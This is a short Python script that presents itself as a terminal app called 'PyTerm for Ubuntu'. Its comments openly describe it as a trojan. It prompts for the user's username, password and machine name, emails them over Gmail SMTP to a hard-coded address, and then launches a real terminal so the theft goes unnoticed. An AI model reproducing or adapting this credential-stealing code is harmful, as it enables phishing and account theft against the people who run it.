# Import modules.
import time
import os
import smtplib

# Drive suspicion away.
print("PyTerm for Ubuntu! The ultimate Python terminal.")
user = input("Enter your username:- ")
password = input("Enter your password:- ")
machine = input("Enter your machine name:- ")

# Prepare to send acquired account info to hacker.
accstr = "username = %s; password = %s; machine = %s" % (user, password, machine)
email = "ansari.ibrahim1@gmail.com"
# edited out my friggin password omg >.>
email_password = ""
server = "smtp.gmail.com"

# Try to send email and set complete var to True, else to False if failed .
try:
        server = smtplib.SMTP(server)
        server.starttls()
        server.login(email, email_password)
        server.sendmail(email, email, accstr)
        server.quit()
        task_complete = True
except:
        task_complete = False

# Do Terminal work.
os.system("x-terminal-emulator")
